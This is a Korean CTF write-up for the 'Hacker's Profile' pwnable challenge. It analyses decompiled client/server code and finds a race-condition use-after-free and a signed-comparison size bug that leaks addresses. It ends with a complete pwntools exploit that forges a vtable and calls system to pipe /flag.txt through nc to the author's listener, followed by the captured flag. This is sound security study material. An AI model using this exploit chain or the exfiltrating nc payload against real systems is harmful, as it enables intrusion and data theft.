---
layout: post
title: "Hacker's Profile Write-up"
image: /img/202308/hp_00.png
tags: [CTF, write-up, pwnable]
---

# Hacker’s Profile Write up

![](/img/202308/hp_01.png)

```plain
Hey, if you're after a profile upgrade, count me in — I'll give it that extra touch of cool.

Hint : race condition + UAF
```

<video width="100%" controls autoplay>
    <source src="/img/202308/hp_02.mp4" type="video/mp4">
</video>

몇가지 입력값을 받고 프로필을 생성해주는 사이트 입니다.

제공된 첨부파일을 열어보면 웹 소스 코드와 client, server 바이너리가 있습니다.

## Rough Analysis

```python
# app.py

wrapper = ctypes.cdll.LoadLibrary("/home/ubuntu/client")

createCard_func = wrapper.createCard
createCard_func.argtypes = [ctypes.c_uint]
createCard_func.restype = ctypes.c_uint

setName_func = wrapper.setName
setName_func.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_char_p]

getName_func = wrapper.getName
getName_func.argtypes = [ctypes.c_uint]
getName_func.restype = ctypes.c_char_p

setLang_func = wrapper.setLang
setLang_func.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]

getLang_func = wrapper.getLang
getLang_func.argtypes = [ctypes.c_uint]
getLang_func.restype = ctypes.c_uint

setSkill_func = wrapper.setSkill
setSkill_func.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]

getSkill_func = wrapper.getSkill
getSkill_func.argtypes = [ctypes.c_uint]
getSkill_func.restype = ctypes.c_uint

setExp_func = wrapper.setExp
setExp_func.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_char_p]

getExp_func = wrapper.getExp
getExp_func.argtypes = [ctypes.c_uint]
getExp_func.restype = ctypes.c_char_p
```

웹에서는 client의 함수들을 로드해서 호출하고 있고 기능은 총 9가지 입니다. 하나의 프로필 정보가 Card 객체에 저장되고, 각 정보들에 대한 getter와 setter들 입니다. 웹 페이지는 이것을 UI 인터페이스로 래핑하는 역할을 합니다.
- createCard, setName, getName, setLang, getLang, setSkill, getSkill, setExp, getExp
- Web (python) + Client (C) ↔ Server (C++)
<br><br>

```python
# app.py

@app.route('/form')
def newCard():
    token = random.randrange(0, 0xffffffff)
    id = createCard_func(token)
    print('token %d' % token)
    return render_template('input.html', token=token, id=id)
```

```cpp
// client

__int64 __fastcall createCard(int a1)
{
  int v2[3]; // [rsp+Ch] [rbp-24h] BYREF
  int fd; // [rsp+18h] [rbp-18h] BYREF
  int buf; // [rsp+1Ch] [rbp-14h] BYREF
  unsigned int v5; // [rsp+20h] [rbp-10h] BYREF
  int Conn; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v2[0] = a1;
  v7 = __readfsqword(0x28u);
  Conn = getConn(&fd);
  if ( Conn >= 0 )
  {
    buf = 0;
    send(fd, &buf, 4uLL, 0);
    send(fd, v2, 4uLL, 0);
    v5 = 0;
    recv(fd, &v5, 4uLL, 0);
    close(fd);
    return v5;
  }
  else
  {
    puts("Error\n");
    return 0LL;
  }
}
```

```cpp
// client

__int64 __fastcall getConn(int *a1)
{
  __int64 result; // rax
  int fd; // [rsp+18h] [rbp-28h]
  struct sockaddr addr; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fd = socket(2, 1, 0);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(7979u);
  LODWORD(result) = connect(fd, &addr, 0x10u);
  *a1 = fd;
  return (unsigned int)result;
}
```

app.py와 client를 같이 보면 분석이 쉽습니다.

app.py에서 `createCard_func(token)`을 호출하면 client의 `createCard` 함수가 호출 됩니다.

client의 `createCard` 함수에서는 server와 connection을 맺고 0을 send 하고 token 값을 send 한 다음 응답 값을 받고 connection을 끝냅니다.

`getConn` 함수 분석을 통해 server는 같은 host의 7979 포트에서 동작한다는 것을 알 수 있습니다.

```cpp
// server

void __fastcall __noreturn serviceStart(int *a1)
...
  recv(fd, &buf, 4uLL, 0);
  if ( !buf )
  {
    createCard(fd);
    pthread_exit(0LL);
  }
```

```cpp
// server

unsigned __int64 __fastcall createCard(int a1)
...
  recv(a1, &buf, 4uLL, 0);  // buf is token
  ...
  Card::Card(v2);
  v8 = v2;
  LODWORD(v7) = i;
  *std::map<int,Card *>::operator[](&myDict, &v7) = v2;
  (**v8)(v8, buf, i);       // vtable function call
  send(a1, &i, 4uLL, 0);
```

server에서는 connection이 맺어질 때마다 `serviceStart` 스레드를 생성합니다. 첫 4 바이트 recv를 통해 어떤 operation을 수행할지 입력 받습니다. 0번은 `createCard` 호출에 해당합니다.

`createCard`에서는 4 바이트 recv를 통해 token 값을 받습니다. 그 후에 랜덤 값 i 를 생성하는 루틴이 있지만 생략하고..

Card 객체를 새로 할당한 후에 myDict에 추가합니다. 그리고 Card vtable의 첫 번째 함수를 호출하며 두 번째 인자는 recv 받은 token 값, 세 번째 인자는 랜덤 값 i를 넘기고 있습니다.

vtable 구성은 Card 생성자를 따라가면 확인할 수 있습니다.

```
; vtable for Card
.data.rel.ro:000000000000ABC0 off_ABC0        dq offset _ZN4Card4initEjj
.data.rel.ro:000000000000ABC0                                         ; DATA XREF: Card::Card(void)+10↑o
.data.rel.ro:000000000000ABC0                                         ; Card::~Card()+10↑o
.data.rel.ro:000000000000ABC0                                         ; Card::init(uint,uint)
.data.rel.ro:000000000000ABC8                 dq offset _ZN4Card7getNameEv ; Card::getName(void)
.data.rel.ro:000000000000ABD0                 dq offset _ZN4Card11getNameSizeEv ; Card::getNameSize(void)
.data.rel.ro:000000000000ABD8                 dq offset _ZN4Card10getExpSizeEv ; Card::getExpSize(void)
.data.rel.ro:000000000000ABE0                 dq offset _ZN4Card7getLangEv ; Card::getLang(void)
.data.rel.ro:000000000000ABE8                 dq offset _ZN4Card8getSkillEv ; Card::getSkill(void)
.data.rel.ro:000000000000ABF0                 dq offset _ZN4Card6getExpEv ; Card::getExp(void)
.data.rel.ro:000000000000ABF8                 dq offset _ZN4Card7setNameEjPc ; Card::setName(uint,char *)
.data.rel.ro:000000000000AC00                 dq offset _ZN4Card7setLangEj ; Card::setLang(uint)
.data.rel.ro:000000000000AC08                 dq offset _ZN4Card8setSkillEj ; Card::setSkill(uint)
.data.rel.ro:000000000000AC10                 dq offset _ZN4Card6setExpEjPc ; Card::setExp(uint,char *)
.data.rel.ro:000000000000AC18                 dq offset _ZN4Card8validateEj ; Card::validate(uint)
```

```cpp
Card *__fastcall Card::init(Card *this, int a2, int a3)
{
  Card *result; // rax

  *(this + 11) = a2;
  result = this;
  *(this + 12) = a3;
  return result;
}
```

vtable의 첫 번째 함수는 `init` 입니다.

인자로 전달 받은 token 은 this + 0x2C, 랜덤값은 this + 0x30 에 저장됩니다.

랜덤값은 각각의 Card를 구분하는 ID 입니다. `serviceStart` 함수에서 createCard operation이 호출되는 경우를 제외하고는 이 ID 값을 이용해서 myDict에서 Card가 있는지 조회한 후 operation을 수행하게 됩니다.

token은 생성된 Card를 수정/삭제 할 때 유효성 검증을 위한 수단입니다.

Card 객체의 구조는 getter와 setter 분석을 통해 쉽게 알 수 있습니다.

```plain
; struct of Card
this + 0x00 : vtable
this + 0x08 : Name buffer
this + 0x10 : Name buffer size
this + 0x14 : Language flag
this + 0x18 : Skill flag
this + 0x20 : Experience buffer
this + 0x28 : Experience buffer size
this + 0x2C : Token
this + 0x30 : ID
```

알아낸 vtable 구조와 Card 객체 구조는 IDA에서 structure로 만들어두면 분석하면서 보기 편합니다.

## Vulnerabilities

```cpp
unsigned __int64 __fastcall card_setName(int a1, struc_card *a2)
{
  unsigned int v2; // eax
  size_t v3; // rbx
  const void *v4; // rax
  int buf; // [rsp+18h] [rbp-28h] BYREF
  unsigned int n; // [rsp+1Ch] [rbp-24h] OVERLAPPED BYREF
  void *n_4; // [rsp+20h] [rbp-20h]
  unsigned __int64 v9; // [rsp+28h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  recv(a1, &buf, 4uLL, 0);              // <-- recv token
  if ( a2->vt->validate(a2, buf) )
  {
    n_4 = 0LL;
    recv(a1, &n, 4uLL, 0);              // <-- recv size
    v2 = a2->vt->getNameSize(a2);
    if ( v2 <= n )
      n_4 = malloc(n);
    else
      n_4 = a2->vt->getName(a2);
    recv(a1, n_4, n, 0);                // <-- recv name
    if ( n > 256 )
      n = 256;
    a2->vt->setName(a2, n, n_4);
    v3 = n;
    v4 = a2->vt->getName(a2);
    send(a1, v4, v3, 0);
  }
  return v9 - __readfsqword(0x28u);
```

`setName` 수행시 token 검증을 위해 token 값을 입력 받습니다. 그 후 name size와 name 문자열을 입력 받습니다.

이런식으로 recv를 기다리는 동안 또 다른 connection을 맺어서 이 객체의 ID, token 으로 삭제를 요청하면 `setName`에서 사용중인 객체가 free 되어 UAF가 발생합니다.

free 된 Card 객체 위치에 name buffer 등 컨트롤 가능한 버퍼를 재할당 시키고 vtable 을 컨트롤 가능한 버퍼 주소로 overwrite 하면 PC 컨트롤이 가능합니다.

### scenario

```plain
1. 첫 번째 스레드 : setName 실행, recv 기다리는 상태
2. 두 번째 스레드 : deleteCard 실행
3. 세 번째 스레드 : 버퍼 할당, target card의 vtable 주소를 fake vtable 주소로 overwrite

4. 첫 번째 스레드 : recv 받고 vtable을 호출하면 fake vtable의 함수가 호출 됨
```

fake vtable 구성을 위해서는 컨트롤 가능한 버퍼 주소를 알아내야 하는데, leak이 가능한 두 번째 취약점이 있습니다.

```cpp
unsigned __int64 __fastcall card_setName(int conn, struct_card *card)
...
  recv(conn, &buf, 4uLL, 0);
  if ( card->vt->validate(card, buf) )
  {
    name_buffer = 0LL;
    recv(conn, &name_buffer_size, 4uLL, 0);
    v2 = card->vt->getNameSize(card);
    if ( v2 <= name_buffer_size )
      name_buffer = malloc(name_buffer_size);
    else
      name_buffer = card->vt->getName(card);
    recv(conn, name_buffer, name_buffer_size, 0);     // <-- point 1
    if ( name_buffer_size > 256 )                     // <-- point 2
      name_buffer_size = 256;
    card->vt->setName(card, name_buffer_size, name_buffer);
    v3 = name_buffer_size;
    v4 = card->vt->getName(card);
    send(conn, v4, v3, 0);
  }
```

```
; point 1
.text:0000000000002C97                 movzx   edx, al         ; n
.text:0000000000002C9A                 mov     rsi, qword ptr [rbp+name_buffer_size+4] ; buf
.text:0000000000002C9E                 mov     eax, [rbp+fd]
.text:0000000000002CA1                 mov     ecx, 0          ; flags
.text:0000000000002CA6                 mov     edi, eax        ; fd
.text:0000000000002CA8                 call    _recv
```

```
; point 2
.text:0000000000002CB5                 jle     short loc_2CBE
.text:0000000000002CB7                 mov     [rbp+name_buffer_size], 100h
.text:0000000000002CBE
.text:0000000000002CBE loc_2CBE:                               ; CODE XREF: card_setName(int,Card *)+F9↑j
.text:0000000000002CBE                 mov     rax, [rbp+var_40]
.text:0000000000002CC2                 mov     rax, [rax]
.text:0000000000002CC5                 add     rax, 38h ; '8'
.text:0000000000002CC9                 mov     r8, [rax]
.text:0000000000002CCC                 mov     ecx, [rbp+name_buffer_size]
.text:0000000000002CCF                 mov     rdx, qword ptr [rbp+name_buffer_size+4]
.text:0000000000002CD3                 mov     rax, [rbp+var_40]
.text:0000000000002CD7                 mov     esi, ecx
.text:0000000000002CD9                 mov     rdi, rax
.text:0000000000002CDC                 call    r8
```

이 취약점은 어셈으로 봤을 때 명확히 보입니다. recv 할 때는 `name_buffer_size`가 담긴 eax에서 al만 취해서 0xff 바이트가 넘지 않는 길이만큼 입력을 받습니다.

그 후 `name_buffer_size`가 0x100 이 넘으면 0x100 을 최대값으로 설정하는 것 처럼 보입니다.

하지만 어셈으로 보면 `jle` 로 비교하고 있습니다. jle는 signed 비교이기 때문에 음수값으로 설정하게 되면 0x100 보다 작으니 검사를 위회하여 음수값을 size로 설정하게 됩니다.

(unsigned 비교를 위해서는 jbe를 사용해야 합니다.)

```cpp
unsigned __int64 __fastcall card_getName(int a1, struct_card *a2)
...
  name_buffer = a2->vt->getName(a2);
  name_buffer_size = a2->vt->getNameSize(a2);
  send(a1, &name_buffer_size, 4uLL, 0);
  send(a1, name_buffer, name_buffer_size, 0);
```

`getName`에서는 `name_buffer`를 `ame_buffer_size` 만큼 출력해주기 때문에 실제 버퍼 크기를 넘어선 overread가 발생하게 됩니다.

## Exploit

malloc과 free를 적절히 이용해서 fake vtable을 구성 해주고, 필요한 gadget을 찾아 슥슥하면 플래그을 얻을 수 있습니다.
```python
from pwn import *
import sys

target = sys.argv[1]
my = sys.argv[2]

print(target, my)

def create():
  r = remote(target, 7979)
  op = 0
  r.send(p32(op))
  token = 0x1337
  r.send(p32(token))
  id = r.recv(4)
  id = u32(id)
  return id

def del_card(_id, _token):
    r = remote(target, 7979)
    op = 0xff
    r.send(p32(op))
    r.send(p32(_id))
    r.send(p32(_token))

def set_name(_id, _token, n, sz):
    r = remote(target, 7979)
    op = 1
    r.send(p32(op))
    r.send(p32(_id))
    r.send(p32(_token))

    r.send(p32(sz))
    r.send(n)

def get_name(_id, _token):
    r = remote(target, 7979)
    op = 0x11
    r.send(p32(op))
    r.send(p32(_id))

    sz = u32(r.recv(4))

    return r.recv(0x200)

card_id = create()
set_name(card_id, 0x1337, b"test", 0xffffffff)
sleep(1)

card_id_2 = create()
sleep(1)

name = get_name(card_id, 0x1337)
name = name[0x110:]
# print(name)
vtable = u64(name[:8])
name_ptr = u64(name[8:16])
print('vtalbe : ', hex(vtable))
print('name_ptr : ', hex(name_ptr))


id_1 = create()
sleep(1)
id_2 = create()

r = remote(target, 7979)
op = 1
r.send(p32(op))
r.send(p32(id_2))
r.send(p32(0x1337))

sleep(1)

del_card(id_2, 0x1337)
sleep(1)

set_name(id_1, 0x1337, b"A"*56, 56)
set_name(id_1, 0x1337, p64(vtable)*2+p64(0x100), 56)

sleep(1)

r.send(p32(50))
r.send(b"\x11")

leak = u64(r.recv(8))

sock_got = 0xae78
init_off = 0x2844
bin_base = leak - init_off
sock_got = bin_base + sock_got

print("bin base : " + hex(bin_base))

id_1 = create()
sleep(1)
id_2 = create()

r = remote(target, 7979)
op = 1
r.send(p32(op))
r.send(p32(id_2))
r.send(p32(0x1337))

sleep(1)

del_card(id_2, 0x1337)
sleep(1)

set_name(id_1, 0x1337, b"A"*56, 56)
set_name(id_1, 0x1337, p64(vtable)+p64(sock_got)+p64(0x100), 56)

sleep(1)
r.send(p32(50))
r.send(b"\x11")

leak = u64(r.recv(8))
print(hex(leak))

offset = 0x127ce0 - 0x50d60
system = leak - offset

print("system " + hex(system))

id_1 = create()
sleep(1)
id_2 = create()

r = remote(target, 7979)
op = 1
r.send(p32(op))
r.send(p32(id_2))
r.send(p32(0x1337))

# write to name_ptr
sleep(1)
del_card(id_2, 0x1337)
sleep(1)
set_name(id_1, 0x1337, b"A"*56, 56)
set_name(id_1, 0x1337, p64(vtable) + p64(name_ptr) + p64(0x100), 56)

sleep(1)
r.send(p32(0x90))

gadget = bin_base + 0x3769
print("gadget : " + hex(gadget))

payload = b''
payload += p64(gadget) * 6
payload += p64(name_ptr+0x60)
payload += p64(0) * 4
payload += p64(system)
payload += b"(cat /flag.txt; cat) | nc "+ my.encode() +b" 4444\x00"
r.send(payload)

id_1 = create()
sleep(1)
id_2 = create()

r = remote(target, 7979)
op = 1
r.send(p32(op))
r.send(p32(id_2))
r.send(p32(0x1337))

# execute gadget
sleep(1)
del_card(id_2, 0x1337)
sleep(1)
set_name(id_1, 0x1337, b"A"*56, 56)
set_name(id_1, 0x1337, p64(name_ptr) + p64(0), 56)

sleep(1)
r.send(p32(50))
```
```
ubuntu@ip-172-31-34-196:~$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on ec2-15-165-100-234.ap-northeast-2.compute.amazonaws.com 60050
HCAMP{$end-it-to-the-DEMON-$how-'em-your-profile-$wag}
```